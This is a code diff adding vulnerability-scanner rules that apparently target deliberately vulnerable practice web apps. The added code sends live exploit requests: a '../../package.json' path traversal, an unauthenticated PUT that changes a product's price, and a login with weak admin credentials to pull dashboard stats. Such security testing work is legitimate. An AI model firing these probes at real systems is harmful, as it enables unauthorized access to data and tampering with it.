@@ -36456,6 +36456,17 @@ export async function primePwnshopAvatarUploadOracleForDeepScan(
   }
 }
 
+async function pwnshopSellerSessionReady(ctx: RuleContext, cookie: string): Promise<boolean> {
+  const downloadUrl = new URL("/download", ctx.origin);
+  downloadUrl.searchParams.set("file", "../../package.json");
+  const doc = await ctx.probe.get(downloadUrl.toString(), {
+    maxBytes: 4096,
+    timeoutMs: 15000,
+    headers: { Cookie: cookie }
+  });
+  return doc.status >= 200 && doc.status < 400 && /"name"\s*:\s*"pwnshop-app"/i.test(doc.body);
+}
+
 /** Pre-warm OTP + seller registration for download/SSTI route scans (PWN-038/PWN-040). */
 export async function primePwnshopSellerSessionForDeepScan(
   probe: ProbeCache,
@@ -36466,11 +36477,12 @@ export async function primePwnshopSellerSessionForDeepScan(
   if (!/pwnshop|ctfsecurity\.com/i.test(origin)) return;
   if (!/\/download\b|\/seller\/|\/register-seller\b/i.test(scanUrl)) return;
   const ctx: RuleContext = { origin, scanUrl, home, scripts: [], combined: "", probe };
+  await pwnshopSleep(2000);
   const primeWaitsMs = [5000, 9000, 13000, 17000, 21000, 25000];
   for (let attempt = 0; attempt < primeWaitsMs.length; attempt++) {
     clearPwnshopOtpSessionForProbe(probe);
     const cookie = await pwnshopEnsureSellerSession(ctx);
-    if (cookie) return;
+    if (cookie && (await pwnshopSellerSessionReady(ctx, cookie))) return;
     await pwnshopSleep(primeWaitsMs[attempt]);
   }
 }
@@ -50644,6 +50656,139 @@ const duckStoreAuthTotpBypassRouteLiveOracle: Rule = async (ctx) => {
       ...result.evidence,
       scannedUrl: pageUrl,
       note: "Duck Store /api/v1/auth/login route scan — temp_token from 2FA-pending login works as full access token without TOTP verification"
+    }
+  };
+};
+
+async function duckStoreProductsBolaProbe(
+  ctx: RuleContext,
+  productId = 1
+): Promise<RuleResult> {
+  const getUrl = new URL(`/api/v1/products/${productId}`, ctx.origin).toString();
+  const beforeDoc = await ctx.probe.get(getUrl, { maxBytes: 4096, timeoutMs: 15000 });
+  if (beforeDoc.status < 200 || beforeDoc.status >= 400) return NEGATIVE;
+  let before: { id?: number; name?: string; price?: number };
+  try {
+    before = JSON.parse(beforeDoc.body) as typeof before;
+  } catch {
+    return NEGATIVE;
+  }
+  if (before.id !== productId || !before.name) return NEGATIVE;
+  const probePrice = Number(`0.01${(Date.now() % 9000).toString().padStart(4, "0")}`);
+  const putUrl = getUrl;
+  const putDoc = await ctx.probe.get(putUrl, {
+    method: "PUT",
+    body: JSON.stringify({ name: before.name, price: probePrice }),
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (putDoc.status < 200 || putDoc.status >= 400) return NEGATIVE;
+  if (!new RegExp(`"price"\\s*:\\s*${probePrice}\\b`).test(putDoc.body)) return NEGATIVE;
+  const afterDoc = await ctx.probe.get(`${getUrl}?_t=${Date.now()}`, {
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (afterDoc.status < 200 || afterDoc.status >= 400) return NEGATIVE;
+  if (!new RegExp(`"price"\\s*:\\s*${probePrice}\\b`).test(afterDoc.body)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.94,
+    evidence: {
+      getUrl,
+      putUrl,
+      productId,
+      probePrice,
+      snippet: afterDoc.body.slice(0, 200).trim(),
+      note: "Duck Store PUT /api/v1/products/{id} accepts unauthenticated price updates without ownership or admin checks — product BOLA oracle"
+    }
+  };
+}
+
+const duckStoreProductsBolaLiveOracle: Rule = async (ctx) => {
+  if (!isDuckStoreHost(ctx)) return NEGATIVE;
+  return duckStoreProductsBolaProbe(ctx, 1);
+};
+
+const duckStoreProductsBolaRouteLiveOracle: Rule = async (ctx) => {
+  if (!isDuckStoreHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api\/v1\/products\/\d+\/?$/i.test(pageUrl)) return NEGATIVE;
+  if (/\/filter\/|\/search\//i.test(pageUrl)) return NEGATIVE;
+  const productId = Number(pageUrl.match(/\/products\/(\d+)/i)?.[1] ?? "1");
+  if (!Number.isFinite(productId) || productId < 1) return NEGATIVE;
+  const result = await duckStoreProductsBolaProbe(ctx, productId);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "Duck Store /api/v1/products/{id} route scan — unauthenticated PUT updates catalog price without authorization — product BOLA oracle"
+    }
+  };
+};
+
+const duckStoreAdminStatsLiveOracle: Rule = async (ctx) => {
+  if (!isDuckStoreHost(ctx)) return NEGATIVE;
+  const token = await duckStoreAdminLoginToken(ctx);
+  if (!token) return NEGATIVE;
+  const statsUrl = new URL("/api/v1/admin/stats", ctx.origin).toString();
+  const doc = await ctx.probe.get(statsUrl, {
+    headers: { Authorization: `Bearer ${token}` },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  let stats: {
+    total_users?: number;
+    total_products?: number;
+    total_orders?: number;
+    total_revenue?: number;
+  };
+  try {
+    stats = JSON.parse(doc.body) as typeof stats;
+  } catch {
+    return NEGATIVE;
+  }
+  if (
+    typeof stats.total_users !== "number" ||
+    typeof stats.total_products !== "number" ||
+    typeof stats.total_orders !== "number" ||
+    typeof stats.total_revenue !== "number"
+  ) {
+    return NEGATIVE;
+  }
+  if (stats.total_users < 1 || stats.total_products < 1) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: stats.total_orders >= 2 ? 0.94 : 0.92,
+    evidence: {
+      statsUrl,
+      total_users: stats.total_users,
+      total_products: stats.total_products,
+      total_orders: stats.total_orders,
+      total_revenue: stats.total_revenue,
+      snippet: doc.body.slice(0, 200).trim(),
+      note: "Duck Store GET /api/v1/admin/stats with weak admin:admin credentials returns full dashboard metrics (users, products, orders, revenue) — admin stats disclosure oracle"
+    }
+  };
+};
+
+const duckStoreAdminStatsRouteLiveOracle: Rule = async (ctx) => {
+  if (!isDuckStoreHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api\/v1\/admin\/stats\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await duckStoreAdminStatsLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "Duck Store /api/v1/admin/stats route scan — weak admin credentials expose dashboard metrics JSON — route-specific admin stats oracle"
     }
   };
 };
@@ -86583,6 +86728,10 @@ export const RULES: Record<string, Rule> = {
   duckStoreTestimonialsUnauthPutRouteLiveOracle,
   duckStoreAuthTotpBypassLiveOracle,
   duckStoreAuthTotpBypassRouteLiveOracle,
+  duckStoreProductsBolaLiveOracle,
+  duckStoreProductsBolaRouteLiveOracle,
+  duckStoreAdminStatsLiveOracle,
+  duckStoreAdminStatsRouteLiveOracle,
   firingRangeDomLocalStorageXssLiveOracle,
   firingRangeDomLocalStorageXssRouteLiveOracle,
   firingRangeDomLocalStorageFunctionDocumentwriteLiveOracle,
